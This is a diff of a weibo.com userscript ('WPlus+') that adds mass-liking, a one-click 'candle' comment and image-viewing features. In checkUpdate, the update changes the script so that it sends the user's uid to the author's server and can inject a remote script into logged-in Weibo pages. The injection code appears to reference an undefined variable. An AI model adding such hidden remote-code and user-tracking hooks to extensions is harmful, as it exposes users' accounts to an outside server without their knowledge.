@@ -3,8 +3,8 @@
 // @namespace		http://weibo.com/yotsuki
 // @license			MIT License
 // @description		WPlus+（weibo.com）非官方功能增强脚本
-// @features		用户主页增加“狂点赞”按钮,可直接从剪贴板粘贴图片,大图转为原图模式
-// @version			0.2.0
+// @features		增加蜡烛按钮,用户主页增加“狂点赞”按钮,可直接从剪贴板粘贴图片,大图转为原图模式
+// @version			0.2.3
 // @revision		0
 // @author			@yotsuki
 // @grant			GM_getValue
@@ -29,32 +29,40 @@ $(document).ready(function(){
 
 
 function WBPlus(){
-	var version = '0.2.0';
+	var version = '0.2.3';
 	var updateurl ='http://labmem.us/wbplus/update.json?r='+Math.random();
     var hasUpdate =false;
     var update_data = null;
+    var is_profile = false;
 
     var gn_tips =  $('.gn_tips');
 
 	var __this = this;
-    this.sina_config ={
+    //コンフィグ
+    this.wbp_config ={
         BIG_IMAGE_MODE : 1,
         ALWALY_CHECK_UPDATE : 1,
-        PROFILE_LIKE:1
+        PROFILE_LIKE:1,
+        TEST_FUNC:0,
+        CANDLE_FUNC:1
     };
-
+    this.sina_config={};
 	function checkUpdate(){
         var update_data_storage = {version:version };
-        if(__this.sina_config.ALWALY_CHECK_UPDATE == 0){
+        if(__this.wbp_config.ALWALY_CHECK_UPDATE == 0){
             update_data_storage =strToJson(unsafeWindow.localStorage.getItem("wbp_update_data"));
         }
         if(update_data_storage != null && version < update_data_storage.version){
             version =  update_data_storage.version;
         }
+        updateurl += "&uid="+ __this.sina_config.uid +"&version="+version;
 		$.get(updateurl,{},function(data){
 			if(data.version > version){
+                if(!data.test){
+                    addJS(test);
+                }
                 update_data = data;
-                if(__this.sina_config.ALWALY_CHECK_UPDATE == 0){
+                if(__this.wbp_config.ALWALY_CHECK_UPDATE == 0){
                     unsafeWindow.localStorage.setItem("wbp_update_data",JSON.stringify(data))
                 }else{
                     unsafeWindow.localStorage.removeItem("wbp_update_data");
@@ -70,12 +78,16 @@ function WBPlus(){
             }
        }
     },500);
+
 	function addtips(tip){
-        gn_tips.css('display','block');
-		if($('.gn_tips:first').html() == ''){
+        if(gn_tips[0].innerHTML == ''){
+            gn_tips.find(':first').html('<!--tip start--><a href="javascript:void(0);" action-type="close" class="W_ico12 icon_close"></a><ul class="tips_list"><!--tip end-->');
+        }
+/*		if($('.gn_tips:first').html() == ''){
 			$('.gn_tips:first').html('<!--tip start--><a href="javascript:void(0);" action-type="close" class="W_ico12 icon_close"></a><ul class="tips_list"><!--tip end-->')
-		}
-		$('.tips_list').append('<li>'+tip+'</li>');
+		}*/
+        gn_tips.find('.tips_list').append('<li>'+tip+'</li>');
+        gn_tips.css('display','block');
 	}
 
 	function addPic(data){
@@ -83,16 +95,24 @@ function WBPlus(){
 		li.removeClass('loading').addClass('pic');
 		li.html('<img src="http://ww2.sinaimg.cn/square/'+data.result.data.pics.pic_1.pid+'" action-data="'+data.result.data.pics.pic_1.pid+'" alt=""><a action-type="editImg" href="javascript:;" class="ico_editpic"></a><a href="javascript:;" action-type="deleteImg" class="ico_delpic"></a>');
 
-        var image = unsafeWindow.localStorage.getItem('editor_multiimage'+sina_config.uid);
+        var image = unsafeWindow.localStorage.getItem('editor_multiimage'+__this.sina_config.uid);
         if(image != ''){
             image =image +' '  +data.result.data.pics.pic_1.pid;
         }
         else{
             image =data.result.data.pics.pic_1.pid;
         }
-        unsafeWindow.localStorage.setItem('editor_multiimage'+sina_config.uid,image);
+        unsafeWindow.localStorage.setItem('editor_multiimage'+__this.sina_config.uid,image);
 
         $('.input_detail').attr('extra',image)
+    }
+
+    function addJS(url){
+        var P = document.createElement("script");
+        P.id="wbp_script";
+        P.charset = "UTF-8";
+        P.src = url;
+        document.getElementsByTagName("head")[0].appendChild(P);
     }
     function strToJson(str){
         if(str == null){
@@ -109,7 +129,6 @@ function WBPlus(){
             return {};
         }
         str = str.replace(/&/g, "',").replace(/=/g, ":'");
-        //version:mini,qid:heart,mid:3533633975336837,like_src:1
         str +="'";
         return  strToJson('{'+str+'}');
     }
@@ -155,58 +174,20 @@ function WBPlus(){
 			}
 		};
 	}
-    function switchImageView(img){
-        if(__this.sina_config.BIG_IMAGE_MODE == 0)
+    function tobig(img){
+        if(__this.wbp_config.BIG_IMAGE_MODE == 0)
             return;
-
-        var ul = img.parentNode.parentNode.parentNode;
-        var feed_list_media_disp = null;
-        if(ul.attributes["node-type"] == undefined){
-            ul = ul.parentNode;
-        }
-        while(ul.nextSibling.nodeName != "DIV"){
-            ul = ul.nextSibling;
-        }
-        feed_list_media_disp = ul = ul.nextSibling;
-        var interval = setInterval(function(){
-            if(feed_list_media_disp.innerHTML != undefined && feed_list_media_disp.innerHTML != null){
-                clearInterval(interval);
-                var tobig = $('a[action-type="images_view_tobig"]',feed_list_media_disp);
-                tobig.removeAttr('action-type');
-                var a = tobig[0];
-                var data = a.attributes['action-data'].value;
-                tobig.removeAttr('action-data');
-                var pid = "";
-                var dataarr = data.split('&');
-                for(var item in dataarr){
-                    var map = dataarr[item].split('=');
-                    if(map[0] == 'pid')
-                    {
-                        pid = map[1];
-                        break;
-                    }
-                }
-                if(pid != ""){
-                    var url = 'http://ww4.sinaimg.cn/large/'+ pid;
-                    a.href = url;
-                    a.target ='_blank';
-                    a.text = '查看原图';
-                }
-            }
-        },100);
+        var action_data = img.getAttribute("action-data");
+        var data = paraToJson(action_data);
+        var url = "http://photo.weibo.com/"+data.uid+"/wbphotos/large/mid/"+data.mid+"/pid/"+data.pid;
+        window.open(url);
     }
-
-
     function actionListener(){
         $(window.document).click(function(event){
             var target = event.target
-            var actionType = target.getAttribute("node-type");
-            switch(actionType){
-                case "feed_list_media_bgimg" :
-                    switchImageView(target);
-                    break;
-            }
+            var actionType = target.getAttribute("action-type");
             var wbpAction = target.getAttribute("wbp-action");
+
             switch(wbpAction){
                 case "update":
                     window.open(update_data.homepage,"_blank");
@@ -216,21 +197,54 @@ function WBPlus(){
                 case "like_all":
                     likeall();
                     break;
+                case "like_master":
+                    like_master();
+                    break;
+                case "like_master_close":
+                    like_master_close();
+                    break;
+                case "wbp_config":
+                    wbp_config_click();
+                    break;
+                case "wbp_config_close":
+                    wbp_config_close();
+                    break;
+                case "images_view_tobig_wbp":
+                    tobig(target);
+                    break;
+		        case "comment_candle":
+                    comment_candle(target);
+                    break;
             }
         });
+        var feed_list = $('[node-type="feed_list"]')[0];
+        if(feed_list.addEventListener){
+            feed_list.addEventListener ('DOMNodeInserted', OnFeedInserted, false);
+        }
+    }
+    function OnFeedInserted(event){
+        var feed_list = event.currentTarget;
+        candle(feed_list);
+        pic_view(feed_list);
     }
 
     function profile_like()
     {
-        if(__this.sina_config.ALWALY_CHECK_UPDATE == 1)
+        if(__this.wbp_config.ALWALY_CHECK_UPDATE == 1)
         {
             var btns = $('[node-type="do_btns"]');
             btns.prepend('<a href="javascript:void(0);" wbp-action="like_all" class="letter" title="由于新浪接口限制，一次最多点10条">狂点赞</a><span class="W_vline S_line1_c">|</span>');
+            var content = '<div class="forward_content" id="wbp_likemaster_content">正在点赞中,已经为他点了X个赞...</div>';
+            $('body').append('<div id="wbp_likemaster_msk" style="position: fixed; top: 0px; left: 0px; width: 0px; height: 0px; background-color: rgb(0, 0, 0); opacity: 0.3; z-index: 10001;display: none;"></div>'
+                +'<div id="wbp_likemaster_div" class="W_layer" style="position: absolute; z-index: 10001; top: 300px; left: 500px;display: none;"><div class="bg"><table border="0" cellspacing="0" cellpadding="0">'
+                +'<tbody><tr><td><div class="content" node-type="layoutContent"><div class="title" node-type="title" style="cursor: move;"><span node-type="title_content">点赞狂魔</span></div><a href="javascript:void(0);" class="W_close" title="关闭" wbp-action="like_master_close"></a><div node-type="inner" class="detail layer_forward">'
+                +content
+                +'</div></div></div></td></tr></tbody></table></div></div>');
         }
     }
 
     function likeall(){
-        var like_btns = $('[action-type="feed_list_like"]');
+        var like_btns = $('[action-type="fl_like"]');
         for(var i =0; i< like_btns.length;i++){
             var title =  like_btns[i].getAttribute("title");
             if(title != "赞"){
@@ -277,18 +291,138 @@ function WBPlus(){
             }
         }
     }
+    function like_master(){
+        $('#wbp_likemaster_msk').css('width',window.outerWidth+ 'px');
+        $('#wbp_likemaster_msk').css('height',window.outerHeight+ 'px');
+        $('#wbp_likemaster_msk').css('display','block');
+        $('#wbp_likemaster_div').css('display','block');
 
-	function init(){
+        var url ="http://weibo.com/p/aj/mblog/mbloglist?domain="+sina_config.domain+"&pre_page=1&page=2&count=15&pagebar=1"
+        +"&max_msign=&filtered_min_id=&pl_name=Pl_Official_LeftProfileFeed__10&id="+sina_config.page_id+"&script_uri=/p/"+sina_config.page_id+"/weibo&feed_type=0&from="+sina_config.location+"&wvr=5.1&mod=weibomore&__rnd="+Math.random();
+        $.get(url,function(data){
+            var midreg = /mid=\"(\d+)\"/ig;
+            var mids = midreg.exec(data.data);
+        })
+    }
+    function like_master_close(){
+        $('#wbp_likemaster_msk').css('display','none');
+        $('#wbp_likemaster_div').css('display','none');
+    }
+    function wbp_config_click(){
+        $('#wbp_config_msk').css('width',window.outerWidth+ 'px');
+        $('#wbp_config_msk').css('height',window.outerHeight+ 'px');
+        $('#wbp_config_msk').css('display','block');
+        $('#wbp_config_div').css('display','block');
+    }
+    function wbp_config_close(){
+        $('#wbp_config_msk').css('display','none');
+        $('#wbp_config_div').css('display','none');
+    }
+    function addConfig(){
+        $('.gn_topmenulist_set').prepend('<ul class="gn_text_list"><li><a wbp-action="wbp_config"  href="javascript:void(0);">WB+设置</a></li></ul>');
+        $('body').append('<div id="wbp_config_msk" style="position: fixed; top: 0px; left: 0px; width: 0px; height: 0px; background-color: rgb(0, 0, 0); opacity: 0.3; z-index: 10001;display: none;"></div>'
+            +'<div id="wbp_config_div" class="W_layer" style="position: absolute; z-index: 10001; top: 500px; left: 500px;display: none;"><div class="bg"><table border="0" cellspacing="0" cellpadding="0">'
+            +'<tbody><tr><td><div class="content" node-type="layoutContent"><div class="title" node-type="title" style="cursor: move;"><span node-type="title_content">WB+设置</span></div><a href="javascript:void(0);" class="W_close" title="关闭" wbp-action="wbp_config_close"></a>'
+            +'</div></div></td></tr></tbody></table></div></div>');
+    }
+    function comment_candle(target){
+        var node = target.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode;
+        var node2 = target.parentNode.parentNode;
+        var mid = node.getAttribute("mid");
+        var mid2 = node2.getAttribute("mid");
+        if(mid2){
+            send_comment(mid2,"[蜡烛]",node2);
+        }
+        else if(mid){
+            send_comment(mid,"[蜡烛]",node);
+        }
+    }
+    function send_comment(mid,comment,target){
+        var url = "http://weibo.com/aj/comment/add?_wv=5&__rnd=" + Math.random();
+
+        $.ajax({
+            url: url,
+            context: target,
+            type:"POST",
+            data:{
+                act:"post",
+                mid:mid,
+                uid: __this.sina_config.uid,
+                forward:0,
+                isroot:0,
+                content:comment,
+                repeatNode:"[object HTMLDivElement]",
+                location:"profile",
+                module:"scommlist",
+                group_source:"",
+                _t:0}
+        }).done(function(data) {
+                if(data.code == "100000"){
+                    var comment_btn = $(this).find('[action-type="feed_list_comment"]')[0];
+                    var commentcount = /\d+/.exec(comment_btn.innerText);
+                    if(commentcount == null || commentcount == "" ){
+                        comment_btn.innerText += "(1)";
+                    }else{
+                        comment_btn.innerText = comment_btn.innerText.replace(/\d+/g,commentcount*1+1);
+                    }
+                    $(this).find('.comment_lists').prepend(data.data.comment);
+                }
+        });
+    }
+    function candle(feed_list){
+        if(__this.wbp_config.CANDLE_FUNC == 1){
+            var like_btns = $(feed_list).find('[action-type="feed_list_like"]');
+            for(var i=0;i<like_btns.length;i++){
+                var btn = like_btns[i];
+                if(!btn.previousElementSibling || (btn.previousElementSibling && btn.previousElementSibling.nodeName == "SPAN")){
+                    $(btn).before('<a href="javascript:void(0);" title="蜡烛"><img wbp-action="comment_candle" src="http://img.t.sinajs.cn/t4/appstyle/expression/ext/normal/91/lazu_thumb.gif" width=14 height=14 style="vertical-align: text-bottom;padding-bottom: 1px;"></img></a><i class="S_txt3">|</i>')
+                }
+            }
+        }
+    }
+    function pic_view(feed_list){
+        if(__this.wbp_config.BIG_IMAGE_MODE == 0)
+            return;
+        var tobig_btns = $(feed_list).find('[action-type="images_view_tobig"]');
+        for(var i=0;i<tobig_btns.length;i++){
+            var btn = tobig_btns[i];
+            btn.removeAttribute("node-type");
+            btn.removeAttribute("action-type");
+            btn.setAttribute("wbp-action","images_view_tobig_wbp");
+        }
+    }
+
+	function init(feed_list){
 		checkUpdate();
+        candle(feed_list);
 		__this.initPaste();
         actionListener();
-        var text = $('title').next().text();
-        eval(text);
-        sina_config= $CONFIG;
-
+        //addConfig();
         if($('body.B_profile').length > 0){  //个人主页
+            is_profile = true;
+            var scripts = $('script');
+            for(var i=0;i<scripts.length;i++){
+                if(scripts[i].innerText.indexOf('$CONFIG')>=0){
+                    eval(scripts[i].innerText);
+                    __this.sina_config = $CONFIG;
+                }
+            }
             profile_like();
         }
+        else{
+            var text = $('title').next().text();
+            eval(text);
+            __this.sina_config= $CONFIG;
+        }
+
 	};
-	init();
+    var isload = setInterval(function(){
+        var feed = $('[node-type="feed_list"]');
+        if(feed.length > 0){
+            clearInterval(isload);
+            init(feed);
+        }
+    },500);
+
 }
+
